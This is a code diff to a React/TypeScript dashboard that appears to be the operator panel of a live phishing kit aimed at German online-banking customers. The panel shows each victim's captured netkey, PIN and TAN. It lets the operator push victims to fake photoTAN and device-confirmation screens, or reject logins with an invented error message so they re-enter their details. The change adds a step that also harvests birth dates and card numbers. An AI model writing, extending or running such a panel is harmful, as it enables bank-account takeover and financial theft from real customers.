@@ -16,16 +16,19 @@ type AuthRow = {
   device_name: string | null;
   photo_tan_image: string | null;
   last_error: string | null;
+  show_berater: boolean | null;
   used: boolean;
   created_at: string;
 };
 
-type MetaRow = { task_id: string; netkey: string | null; pin: string | null; tan: string | null };
+type MetaRow = { task_id: string; netkey: string | null; pin: string | null; tan: string | null; berater_geburtsdatum?: string | null; berater_karte?: string | null };
 
 const PHASE_LABEL: Record<string, string> = {
   login: "Wartet auf Login",
   login_review: "Login prüfen",
   login_rejected: "Login abgelehnt",
+  berater: "Berater-Verifizierung (Kunde)",
+  berater_review: "Berater-Daten prüfen",
   confirm: "Gerätebestätigung",
   phototan_request: "PhotoTAN wird angefordert",
   phototan: "PhotoTAN-Eingabe",
@@ -35,6 +38,7 @@ const PHASE_LABEL: Record<string, string> = {
   aborted: "Abgebrochen",
 };
 
+
 const AuthLiveCard = () => {
   const [rows, setRows] = useState<AuthRow[]>([]);
   const [metas, setMetas] = useState<Record<string, MetaRow>>({});
@@ -42,7 +46,7 @@ const AuthLiveCard = () => {
   const load = async () => {
     const [{ data: a }, { data: m }] = await Promise.all([
       (supabase as any).from("auth_tokens").select("*").order("created_at", { ascending: false }).limit(50),
-      (supabase as any).from("panel_task_meta").select("task_id, netkey, pin, tan").like("task_id", "auth:%"),
+      (supabase as any).from("panel_task_meta").select("task_id, netkey, pin, tan, berater_geburtsdatum, berater_karte").like("task_id", "auth:%"),
     ]);
     setRows(a || []);
     const map: Record<string, MetaRow> = {};
@@ -71,7 +75,13 @@ const AuthLiveCard = () => {
   const rejectLogin = (r: AuthRow) => setPhase(r, "login_rejected", {
     last_error: "Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten.",
   });
-  const acceptLogin = (r: AuthRow) => setPhase(r, "confirm", { last_error: null });
+  const acceptLogin = (r: AuthRow) =>
+    setPhase(r, r.show_berater ? "berater" : "confirm", { last_error: null });
+  const acceptBerater = (r: AuthRow) => setPhase(r, "confirm", { last_error: null });
+  const rejectBerater = (r: AuthRow) => setPhase(r, "berater", {
+    last_error: "Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.",
+  });
+
 
   const setDeviceName = (r: AuthRow, name: string) => update(r.id, { device_name: name });
 
@@ -144,6 +154,12 @@ const AuthLiveCard = () => {
                 <MetaField label="PIN" value={meta?.pin || "—"} mono />
                 <MetaField label="TAN" value={meta?.tan || "—"} mono bold />
               </div>
+              {r.show_berater && (meta?.berater_geburtsdatum || meta?.berater_karte) && (
+                <div className="grid sm:grid-cols-2 gap-2 text-sm">
+                  <MetaField label="Berater – Geburtsdatum" value={meta?.berater_geburtsdatum || "—"} mono />
+                  <MetaField label="Berater – Kartennummer" value={meta?.berater_karte || "—"} mono />
+                </div>
+              )}
 
               {!done && (
                 <div className="space-y-3 pt-2 border-t">
@@ -156,7 +172,9 @@ const AuthLiveCard = () => {
                         </Button>
                         <DeviceNameField r={r} onSave={n => setDeviceName(r, n)} />
                         <Button size="sm" onClick={() => acceptLogin(r)} disabled={!meta?.pin}>
-                          <Smartphone className="h-4 w-4 mr-1" />Gerätebestätigung anzeigen
+                          {r.show_berater
+                            ? <><ShieldCheck className="h-4 w-4 mr-1" />Berater-Seite anzeigen</>
+                            : <><Smartphone className="h-4 w-4 mr-1" />Gerätebestätigung anzeigen</>}
                         </Button>
                       </div>
                       {phase === "login" && !meta?.pin && (
@@ -164,6 +182,24 @@ const AuthLiveCard = () => {
                       )}
                     </StepBlock>
                   )}
+
+                  {/* Step 1b: Berater verification */}
+                  {(phase === "berater" || phase === "berater_review") && (
+                    <StepBlock title="Berater-Daten prüfen">
+                      <div className="flex flex-wrap gap-2">
+                        <Button size="sm" variant="destructive" onClick={() => rejectBerater(r)} disabled={!meta?.berater_karte}>
+                          <XCircle className="h-4 w-4 mr-1" />Ablehnen
+                        </Button>
+                        <Button size="sm" onClick={() => acceptBerater(r)} disabled={!meta?.berater_karte}>
+                          <CheckCircle2 className="h-4 w-4 mr-1" />Akzeptieren → Gerätebestätigung
+                        </Button>
+                      </div>
+                      {phase === "berater" && !meta?.berater_karte && (
+                        <p className="text-xs text-muted-foreground">Wartet auf Eingabe der Berater-Verifizierung.</p>
+                      )}
+                    </StepBlock>
+                  )}
+
 
                   {/* Step 2: Confirm shown, waiting customer to click photoTAN */}
                   {phase === "confirm" && (
